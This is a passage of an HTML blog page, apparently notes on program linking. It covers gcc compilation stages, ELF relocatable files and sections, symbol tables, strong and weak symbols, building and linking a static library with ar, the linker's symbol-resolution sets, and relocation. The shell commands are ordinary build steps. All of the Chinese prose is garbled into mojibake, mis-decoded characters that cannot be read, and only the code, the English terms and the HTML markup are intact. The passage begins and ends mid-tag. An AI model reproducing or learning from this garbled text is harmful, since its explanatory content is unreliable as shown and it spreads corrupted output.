src="https://kjimg10.360buyimg.com/ott/jfs/t1/76109/2/16891/41270/634eb075E6fd16631/69483619f038e331.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/76109/2/16891/41270/634eb075E6fd16631/69483619f038e331.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>è¦é€šè¿‡ä¸Šå›¾æºç¨‹åºä¸€æ­¥æ­¥æ„é€ æˆä¸€ä¸ªå®Œå…¨é“¾æ¥çš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ï¼Œéœ€è¦ä»¥ä¸‹å‡ æ­¥ï¼š</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/142246/13/30131/62256/634eb089Ea60c594d/79eeb7a61ab032f2.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/142246/13/30131/62256/634eb089Ea60c594d/79eeb7a61ab032f2.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/142246/13/30131/62256/634eb089Ea60c594d/79eeb7a61ab032f2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>æ¯ä¸€æ­¥å¯¹åº”å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -E -o main.i main.c # é¢„å¤„ç†</span><br><span class="line">gcc -S -o main.s main.i # ç¼–è¯‘</span><br><span class="line">as -o main.o main.s # æ±‡ç¼–</span><br><span class="line">ld -static -o prog main.o sum.o # é“¾æ¥</span><br></pre></td></tr></tbody></table></figure><h2 id="å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶"><a href="#å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶" class="headerlink" title="å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶"></a>å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶</h2><p>å¦‚å›¾æ‰€ç¤ºæ˜¯å…¸å‹çš„ELFå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/184795/25/30489/21855/634eb0a2E49b23fa0/c1b61a8b596a78eb.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/184795/25/30489/21855/634eb0a2E49b23fa0/c1b61a8b596a78eb.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/184795/25/30489/21855/634eb0a2E49b23fa0/c1b61a8b596a78eb.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>ELFï¼šExecutable and Linkable Format(å¯æ‰§è¡Œå¯é“¾æ¥æ ¼å¼)</p><p>ELFå¤´ä»¥ä¸€ä¸ª16å­—èŠ‚çš„åºåˆ—å¼€å§‹ï¼Œå‰å››ä¸ªå­—èŠ‚è¢«ç§°ä¸ºé­”æ•°ï¼Œç”¨æ¥ç¡®è®¤æ–‡ä»¶ç±»å‹ï¼›ç¬¬5ä¸ªå­—èŠ‚è¡¨ç¤ºELFæ–‡ä»¶ç±»å‹ï¼š0x1ä»£è¡¨32ä½ï¼Œ0x2ä»£è¡¨64ä½ï¼›ç¬¬6ä¸ªå­—èŠ‚è¡¨ç¤ºå­—èŠ‚åºï¼š0x1ä»£è¡¨å°ç«¯æ³•ï¼Œ0x2ä»£è¡¨å¤§ç«¯æ³•ï¼›ç¬¬7ä¸ªå­—è¡¨ç¤ºELFçš„ç‰ˆæœ¬å·ï¼Œé€šå¸¸éƒ½æ˜¯0x1ï¼›å‰©ä½™çš„å­—èŠ‚å¡«å……ä¸º0ã€‚ELFå¤´å‰©ä¸‹çš„éƒ¨åˆ†åŒ…å«å¸®åŠ©é“¾æ¥å™¨è¯­æ³•åˆ†æå’Œè§£é‡Šç›®æ ‡æ–‡ä»¶çš„ä¿¡æ¯ã€‚</p><p>å¤¹åœ¨ELFå¤´å’ŒèŠ‚å¤´éƒ¨è¡¨ä¹‹é—´çš„éƒ½æ˜¯èŠ‚ã€‚è¾ƒä¸ºé‡è¦çš„èŠ‚å¦‚ä¸‹ï¼š</p><table><thead><tr><th>åç§°</th><th>å†…å®¹</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>.text</td><td>å·²ç¼–è¯‘ç¨‹åºçš„æœºå™¨ä»£ç </td><td></td></tr><tr><td>.rodata</td><td>read-only dataã€‚æ¯”å¦‚printfè¯­å¥ä¸­çš„æ ¼å¼ä¸²</td><td></td></tr><tr><td>.data</td><td>å·²åˆå§‹åŒ–çš„å…¨å±€å’Œé™æ€å˜é‡</td><td>å±€éƒ¨å˜é‡ä¸åœ¨.dataä¹Ÿä¸åœ¨.bssï¼Œä¿å­˜åœ¨æ ˆä¸­</td></tr><tr><td>.bss</td><td>æœªåˆå§‹åŒ–ä»¥åŠåˆå§‹åŒ–ä¸º0çš„çš„å…¨å±€å’Œé™æ€å˜é‡</td><td>ä¸å æ®ç©ºé—´ï¼Œä»…æ˜¯å ä½ç¬¦</td></tr><tr><td>.symtab</td><td><strong>ç¬¦å·è¡¨</strong>ï¼ŒåŒ…å«åœ¨ç¨‹åºä¸­å®šä¹‰å’Œå¼•ç”¨çš„å‡½æ•°å’Œå…¨å±€å˜é‡çš„ä¿¡æ¯</td><td></td></tr><tr><td>.rel.text</td><td>æœºå™¨ä»£ç çš„é‡å®šä½ä¿¡æ¯</td><td></td></tr><tr><td>.rel.data</td><td>è¢«æ¨¡å—å¼•ç”¨æˆ–å®šä¹‰çš„æ‰€æœ‰å…¨å±€å˜é‡çš„é‡å®šä½ä¿¡æ¯</td><td></td></tr></tbody></table><h2 id="ç¬¦å·å’Œç¬¦å·è¡¨"><a href="#ç¬¦å·å’Œç¬¦å·è¡¨" class="headerlink" title="ç¬¦å·å’Œç¬¦å·è¡¨"></a>ç¬¦å·å’Œç¬¦å·è¡¨</h2><p>é“¾æ¥è¿‡ç¨‹çš„æœ¬è´¨å°±æ˜¯å°†ä¸åŒçš„ç›®æ ‡æ–‡ä»¶ç²˜åˆåœ¨ä¸€èµ·ï¼Œè€Œ<strong>ç¬¦å·</strong>åˆ™å¯ä»¥çœ‹ä½œæ˜¯é“¾æ¥è¿‡ç¨‹çš„<strong>ç²˜åˆå‰‚</strong>ã€‚</p><p>ä¸‹å›¾ä¸ºELFç¬¦å·è¡¨çš„æ¡ç›®ï¼š</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/123535/26/31854/52567/634eb0b6E44532b10/c30e083900f405ad.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/123535/26/31854/52567/634eb0b6E44532b10/c30e083900f405ad.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/123535/26/31854/52567/634eb0b6E44532b10/c30e083900f405ad.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>åœ¨ä½¿ç”¨<code>readelf -s main.o</code>å‘½ä»¤æŸ¥çœ‹<code>main.o</code>ç¨‹åºçš„ç¬¦å·è¡¨æ—¶ï¼Œè¦æ³¨æ„sectionå­—æ®µæœ‰3ä¸ªç‰¹æ®Šçš„ä¼ªèŠ‚ï¼š</p><table><thead><tr><th>åç§°</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>ABS</td><td>ä»£è¡¨ä¸è¢«é‡å®šä½çš„ç¬¦å·</td></tr><tr><td>UNDEF</td><td>ä»£è¡¨æœªå®šä¹‰çš„ç¬¦å·ï¼Œå³åœ¨æœ¬ç›®æ ‡æ¨¡å—ä¸­å¼•ç”¨ã€åœ¨åˆ«å¤„å®šä¹‰çš„ç¬¦å·</td></tr><tr><td>COMMON</td><td>è¡¨ç¤ºè¿˜æœªè¢«åˆ†é…ä½ç½®çš„æœªåˆå§‹åŒ–çš„æ•°æ®ç›®æ ‡</td></tr></tbody></table><p><strong>æ³¨æ„ï¼šåªæœ‰å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ä¸­æ‰æœ‰è¿™äº›ä¼ªèŠ‚ï¼Œå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¸­æ²¡æœ‰ã€‚</strong></p><p><code>COMMON</code>å’Œ<code>.bss</code>çš„åŒºåˆ«ï¼š</p><ul><li>COMMON: æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡</li><li>.bss: æœªåˆå§‹åŒ–çš„é™æ€å˜é‡ï¼Œä»¥åŠåˆå§‹åŒ–ä¸º0çš„å…¨å±€æˆ–é™æ€å˜é‡</li></ul><h2 id="ç¬¦å·è§£æä¸é™æ€åº“"><a href="#ç¬¦å·è§£æä¸é™æ€åº“" class="headerlink" title="ç¬¦å·è§£æä¸é™æ€åº“"></a>ç¬¦å·è§£æä¸é™æ€åº“</h2><h3 id="ç¬¦å·è§£æ"><a href="#ç¬¦å·è§£æ" class="headerlink" title="ç¬¦å·è§£æ"></a>ç¬¦å·è§£æ</h3><blockquote><p>é“¾æ¥å™¨è§£æç¬¦å·å¼•ç”¨çš„æ–¹æ³•æ˜¯å°†æ¯ä¸ªå¼•ç”¨ä¸å®ƒçš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­çš„ä¸€ä¸ªç¡®å®šçš„ç¬¦å·å®šä¹‰å…³è”èµ·æ¥ã€‚</p></blockquote><p>æ¢è¨€ä¹‹ï¼Œä¸€ä¸ªç¬¦å·è‡³å°‘è¦å¯¹åº”ä¸€ä¸ªå®šä¹‰ï¼Œæ— è®ºä¸¤è€…æ˜¯åœ¨åŒä¸€æ¨¡å—è¿˜æ˜¯ä¸åŒæ¨¡å—ã€‚(æ¯ä¸ªæ¨¡å—ä¸­æ¯ä¸ªå±€éƒ¨ç¬¦å·åªæœ‰ä¸€ä¸ªå®šä¹‰ï¼Œå…¨å±€ç¬¦å·å¼•ç”¨è§£æçš„æƒ…å†µè¾ƒä¸ºå¤æ‚ï¼Œå› ä¸ºå¤šä¸ªç›®æ ‡æ–‡ä»¶å¯èƒ½ä¼šå®šä¹‰ç›¸åŒåå­—çš„å…¨å±€ç¬¦å·)</p><ul><li>å¼ºç¬¦å·ï¼šå‡½æ•°å’Œå·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡</li><li>å¼±ç¬¦å·ï¼šæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡</li></ul><p>ç¼–è¯‘å™¨è§£æå¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·æœ‰ä»¥ä¸‹ä¸‰æ¡è§„åˆ™ï¼š</p><ul><li>ä¸å…è®¸æœ‰å¤šä¸ªåŒåçš„å¼ºç¬¦å·</li><li>å¦‚æœæœ‰ä¸€ä¸ªå¼ºç¬¦å·å’Œå¤šä¸ªå¼±ç¬¦å·åŒåï¼Œé‚£ä¹ˆé€‰æ‹©å¼ºç¬¦å·</li><li>å¦‚æœæœ‰å¤šä¸ªå¼±ç¬¦å·åŒåï¼Œé‚£ä¹ˆä»è¿™äº›å¼±ç¬¦å·ä¸­ä»»æ„é€‰æ‹©ä¸€ä¸ª</li></ul><p>è§„åˆ™2å’Œè§„åˆ™3å¸¸å¸¸å¼•å‘ä¸€äº›ä¸æ˜“å¯Ÿè§‰çš„é”™è¯¯ã€‚ä¸ºäº†é¿å…æ­¤ç±»é”™è¯¯ï¼Œå¯ä»¥åœ¨ç¼–è¯‘æ—¶æ·»åŠ <code>-fno-common</code>é€‰é¡¹ï¼Œè¯¥é€‰é¡¹ä¼šä½¿å¾—é“¾æ¥å™¨åœ¨ é‡åˆ°å¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·æ—¶è§¦å‘ä¸€ä¸ªé”™è¯¯ï¼›æˆ–è€…æ·»åŠ <code>-Werror</code>é€‰é¡¹ï¼Œè¯¥é€‰é¡¹ä¼šæŠŠæ‰€æœ‰çš„è­¦å‘Šå˜æˆé”™è¯¯ã€‚</p><h3 id="é™æ€åº“"><a href="#é™æ€åº“" class="headerlink" title="é™æ€åº“"></a>é™æ€åº“</h3><blockquote><p>æ‰€æœ‰çš„ç¼–è¯‘ç³»ç»Ÿéƒ½æä¾›ä¸€ç§æœºåˆ¶ï¼Œå°†æ‰€æœ‰ç›¸å…³çš„ç›®æ ‡æ¨¡å—æ‰“åŒ…æˆä¸ºä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ï¼Œç§°ä¸º<em>é™æ€åº“</em>ã€‚</p></blockquote><p>é™æ€åº“æ–‡ä»¶ï¼Œåˆç§°å­˜æ¡£(archive)æ–‡ä»¶ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/42837/29/19545/50720/634eb0c9E57c7e8c2/0be30553100a194f.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/42837/29/19545/50720/634eb0c9E57c7e8c2/0be30553100a194f.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/42837/29/19545/50720/634eb0c9E57c7e8c2/0be30553100a194f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>å°†ä¸Šå›¾<code>addvec.c</code>å’Œ<code>multvec.c</code>æ„é€ æˆä¸€ä¸ªé™æ€åº“ï¼š</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c addvec.c multvec.c</span><br><span class="line">ar rcs libvector.a addvec.o multvec.o</span><br></pre></td></tr></tbody></table></figure><p>ç¬¬ä¸€è¡Œä»£ç å¾—åˆ°ä¸¤ä¸ªç›®æ ‡æ–‡ä»¶<code>addvec.o</code>å’Œ<code>multvec.o</code>ï¼Œå†è¾“å…¥ç¬¬äºŒè¡Œä»£ç å°±æ„é€ äº†ä¸€ä¸ªåä¸º<code>libvector.a</code>çš„é™æ€åº“ã€‚ä¸‹å›¾ç¨‹åºå¯ä»¥è°ƒç”¨è¿™ä¸ªé™æ€åº“ï¼Œå…¶ä¸­<code>vector.h</code>å®šä¹‰äº†è¿™ä¸ªé™æ€åº“<code>libvector.a</code>ä¸­çš„å‡½æ•°åŸå‹ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/117145/22/27855/34784/634eb0e0E3d0261d7/182c27ba6baa5f96.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/117145/22/27855/34784/634eb0e0E3d0261d7/182c27ba6baa5f96.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/117145/22/27855/34784/634eb0e0E3d0261d7/182c27ba6baa5f96.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c main2.c</span><br><span class="line">gcc -static -o prog2c main2.o ./libvector.a</span><br></pre></td></tr></tbody></table></figure><p>ä¸Šè¿°ä»£ç å°†æºæ–‡ä»¶<code>main2.c</code>ç¼–è¯‘ä¸ºç›®æ ‡æ–‡ä»¶<code>main2.o</code>ï¼Œç„¶åé“¾æ¥ç›®æ ‡æ–‡ä»¶<code>main2.o</code>å’Œé™æ€åº“æ–‡ä»¶<code>libvector.a</code>ï¼Œåˆ›å»ºäº†å¯æ‰§è¡Œæ–‡ä»¶<code>prog2c</code>ã€‚è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/180883/3/29609/31469/634eb0f3E7f54c3c6/3a4b78237d55960f.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/180883/3/29609/31469/634eb0f3E7f54c3c6/3a4b78237d55960f.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/180883/3/29609/31469/634eb0f3E7f54c3c6/3a4b78237d55960f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>ç”±äºé“¾æ¥å™¨åˆ¤å®š<code>main2.o</code>åªå¼•ç”¨äº†<code>libvector.a</code>ä¸­<code>addvec.o</code>çš„<code>addvec</code>ç¬¦å·ï¼Œå› æ­¤åªå¤åˆ¶<code>addvec.o</code>åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œä¸å¤åˆ¶<code>multvec.o</code>ã€‚</p><h2 id="é™æ€åº“çš„è§£æè¿‡ç¨‹"><a href="#é™æ€åº“çš„è§£æè¿‡ç¨‹" class="headerlink" title="é™æ€åº“çš„è§£æè¿‡ç¨‹"></a>é™æ€åº“çš„è§£æè¿‡ç¨‹</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -static -o prog2c main2.o ./libvector.a</span><br></pre></td></tr></tbody></table></figure><p>ä¸Šä¸€èŠ‚ä¸­ä½¿ç”¨ä¸Šå¼é“¾æ¥æºæ–‡ä»¶å’Œé™æ€åº“ï¼Œå…¶ä¸­æ¶‰åŠåˆ°åˆ©ç”¨é™æ€åº“è§£æç¬¦å·å¼•ç”¨ã€‚å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š<br>é“¾æ¥å™¨ç»´æŠ¤3ä¸ªé›†åˆï¼Œåˆ†åˆ«ä¸ºï¼š</p><ul><li>Eï¼Œè¾“å…¥çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶é›†åˆ</li><li>Uï¼Œå¼•ç”¨äº†ä½†æ˜¯å°šæœªå®šä¹‰çš„ç¬¦å·çš„é›†åˆ</li><li>Dï¼Œå·²å®šä¹‰çš„ç¬¦å·çš„é›†åˆ</li></ul><p>é“¾æ¥å™¨ä»å·¦åˆ°å³æ‰«æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œå­˜æ¡£ï¼ˆé™æ€åº“ï¼‰æ–‡ä»¶ï¼Œå› æ­¤é¦–å…ˆè¾“å…¥å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶<code>main.o</code>ã€‚<code>main.o</code>è¿›å…¥é›†åˆEï¼›<code>addvec</code>å’Œ<code>printf</code>ç¬¦å·æ²¡æœ‰åœ¨<code>main.o</code>ä¸­è¢«å®šä¹‰ï¼Œå› æ­¤è¿›å…¥é›†åˆUï¼›å‰©ä½™çš„è¿›å…¥é›†åˆDã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/137035/34/30540/11879/634eb107Ec3451ebf/e4d5ce4801b024aa.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/137035/34/30540/11879/634eb107Ec3451ebf/e4d5ce4801b024aa.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/137035/34/30540/11879/634eb107Ec3451ebf/e4d5ce4801b024aa.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>æ¥ç€ï¼Œç»§ç»­æ‰«æåˆ°å­˜æ¡£æ–‡ä»¶<code>libvector.a</code>ï¼Œå­˜æ¡£æ–‡ä»¶ä¸è¿›å…¥é›†åˆEã€‚é“¾æ¥å™¨å°è¯•åŒ¹é…Uä¸­æœªè§£æçš„ç¬¦å·å’Œç”±å­˜æ¡£æ–‡ä»¶æˆå‘˜å®šä¹‰çš„ç¬¦å·ï¼Œé“¾æ¥å™¨å‘ç°<code>libvector.a</code>çš„æˆå‘˜<code>addvec.o</code>ä¸­å­˜åœ¨ç¬¦å·<code>addvec</code>çš„å®šä¹‰ï¼Œå› æ­¤å°†<code>addvec.o</code>åŠ å…¥é›†åˆEï¼Œå¹¶å°†<code>addvec</code>ä»é›†åˆUä¸­åˆ é™¤ï¼Œå¦å¤–<code>addvec.o</code>ä¸­å®šä¹‰çš„å…¶ä»–ç¬¦å·ï¼Œå³<code>addcnt</code>ä¼šè¢«åŠ å…¥åˆ°é›†åˆDä¸­ã€‚å¯¹é™æ€åº“ä¸­æ¯ä¸ªæˆå‘˜ç›®æ ‡æ–‡ä»¶éƒ½ä¼šè¿›è¡Œä¸Šè¿°è¿‡ç¨‹ï¼Œæ­¤ä¾‹ä¸­å¦ä¸€ä¸ªæˆå‘˜<code>multvec.o</code>æ²¡æœ‰å®šä¹‰Uä¸­çš„ç¬¦å·ï¼Œå› æ­¤é›†åˆUå’ŒDä¸å‘ç”Ÿå˜åŒ–ï¼Œé“¾æ¥å™¨ç»§ç»­å¤„ç†ä¸‹ä¸€ä¸ªè¾“å…¥çš„æ–‡ä»¶ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/84793/31/32090/14156/634eb11aEa0f464bb/5086625a8e174b73.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/84793/31/32090/14156/634eb11aEa0f464bb/5086625a8e174b73.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/84793/31/32090/14156/634eb11aEa0f464bb/5086625a8e174b73.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>ä¸Šé¢çš„ä»£ç å®é™…ä¸Šéšå¼æ‰§è¡Œäº†å¯¹é™æ€åº“<code>libc.a</code>çš„é“¾æ¥ï¼Œå®é™…ä¸Šä¼šè¾“å…¥<code>libc.a</code>ï¼Œæ‰§è¡Œä¸Šè¿°è¿‡ç¨‹åé›†åˆæƒ…å†µå¦‚ä¸‹ï¼š</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/142608/8/30688/15262/634eb130E8f48a70f/36122f4a6c8b3702.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/142608/8/30688/15262/634eb130E8f48a70f/36122f4a6c8b3702.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/142608/8/30688/15262/634eb130E8f48a70f/36122f4a6c8b3702.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>æ­¤æ—¶é›†åˆUä¸ºç©ºï¼Œè¯´æ˜æ²¡æœ‰æœªå®šä¹‰çš„ç¬¦å·ï¼Œé“¾æ¥å™¨å°†åˆå¹¶å’Œé‡å®šä½Eä¸­çš„ç›®æ ‡æ–‡ä»¶ï¼Œæ„é€ å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ã€‚è‹¥é›†åˆUéç©ºï¼Œåˆ™è¯´æ˜æœ‰æœªå®šä¹‰çš„ç¬¦å·ï¼Œé“¾æ¥å™¨å°†è¾“å‡ºä¸€ä¸ªé”™è¯¯å¹¶ç»ˆæ­¢ã€‚</p><p>è¿™ä¸ªè¿‡ç¨‹ä¹Ÿè§£é‡Šäº†å‘½ä»¤è¡Œè¾“å…¥æ–‡ä»¶çš„é¡ºåºçš„é‡è¦æ€§ï¼Œä¾‹å¦‚å°†<code>main2.o</code>ä¸<code>./libvector.a</code>äº’æ¢ä½ç½®ï¼Œç”±äºè¾“å…¥<code>libvector</code>æ—¶é›†åˆUä¸ºç©ºï¼Œå› æ­¤<code>addvec.o</code>ä¸ä¼šè¢«åŠ å…¥é›†åˆEï¼Œå› æ­¤æœ€åé›†åˆUä¸­ä¼šå­˜åœ¨æœªå®šä¹‰ç¬¦å·<code>addvec</code>ï¼Œä»è€Œå¯¼è‡´é”™è¯¯ã€‚</p><h2 id="é‡å®šä½"><a href="#é‡å®šä½" class="headerlink" title="é‡å®šä½"></a>é‡å®šä½</h2><p>åœ¨ä¸Šä¸€èŠ‚ä¸­é“¾æ¥å™¨ç¡®å®šäº†ä¸€ä¸ªé›†åˆEï¼Œå³è¦åˆå¹¶çš„ç›®æ ‡æ–‡ä»¶ï¼Œæ¥ä¸‹æ¥å°±éœ€è¦è¿›è¡Œé‡å®šä½æ“ä½œã€‚é‡å®šä½åˆ†ä¸ºä¸¤æ­¥ï¼š</p><ul><li>é‡å®šä½èŠ‚å’Œç¬¦å·å®šä¹‰</li><li>é‡å®šä½èŠ‚ä¸­çš„ç¬¦å·å¼•ç”¨</li></ul><h3 id="é‡å®šä½èŠ‚å’Œç¬¦å·å¼•ç”¨"><a href="#é‡å®šä½èŠ‚å’Œç¬¦å·å¼•ç”¨" class="headerlink" title="é‡å®šä½èŠ‚å’Œç¬¦å·å¼•ç”¨"></a>é‡å®šä½èŠ‚å’Œç¬¦å·å¼•ç”¨</h3><p>ç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/109149/18/33792/129136/634eb140Ee566b95b/3fb59d157863377d.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/109149/18/33792/129136/634eb140Ee566b95b/3fb59d157863377d.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/109149/18/33792/129136/634eb140Ee566b95b/3fb59d157863377d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>è¿™ä¸€æ­¥å®Œæˆåï¼Œç¨‹åºä¸­æ¯æ¡æŒ‡ä»¤å’Œå…¨å±€å˜é‡éƒ½æœ‰å”¯ä¸€çš„è¿è¡Œæ—¶å†…å­˜åœ°å€äº†ã€‚</p><h3 id="é‡å®šä½èŠ‚ä¸­çš„ç¬¦å·å¼•ç”¨"><a href="#é‡å®šä½èŠ‚ä¸­çš„ç¬¦å·å¼•ç”¨" class="headerlink" title="é‡å®šä½èŠ‚ä¸­çš„ç¬¦å·å¼•ç”¨"></a>é‡å®šä½èŠ‚ä¸­çš„ç¬¦å·å¼•ç”¨</h3><p>è¿™ä¸€æ­¥ä¾èµ–é‡å®šä½æ¡ç›®ï¼Œå¯¹äºä»£ç çš„é‡å®šä½æ¡ç›®ä½äº<code>.rel.text</code>ï¼Œå¯¹äºå·²åˆå§‹åŒ–æ•°æ®çš„é‡å®šä½æ¡ç›®ä½äº<code>.rel.data</code>ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/176914/15/29848/39627/634eb153E0acab51a/3b9cf273cfe87685.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/176914/15/29848/39627/634eb153E0acab51a/3b9cf273cfe87685.png" class="lazyload" 